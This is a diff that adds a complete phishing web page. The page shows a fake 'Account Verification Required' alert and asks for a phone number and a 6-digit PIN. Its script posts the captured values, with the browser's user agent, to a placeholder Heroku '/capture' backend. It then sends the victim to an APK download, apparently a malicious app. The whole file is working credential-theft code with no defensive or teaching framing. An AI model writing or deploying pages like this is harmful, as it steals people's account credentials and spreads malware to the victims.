@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Alert Required</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h2>⚠️ Account Verification Required</h2>
+    <form id="phishForm">
+        <input type="text" id="phone" placeholder="Phone Number" required><br>
+        <input type="password" id="pin" placeholder="6-digit PIN" required><br>
+        <button type="button" onclick="sendToJavaServer()">Verify Now</button>
+    </form>
+    
+    <script>
+        function sendToJavaServer() {
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            
+            // Send to your Java backend
+            fetch('https://your-java-backend.herokuapp.com/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phone,
+                    pin: pin,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to APK download
+                    window.location.href = 'https://your-java-backend.herokuapp.com/download';
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
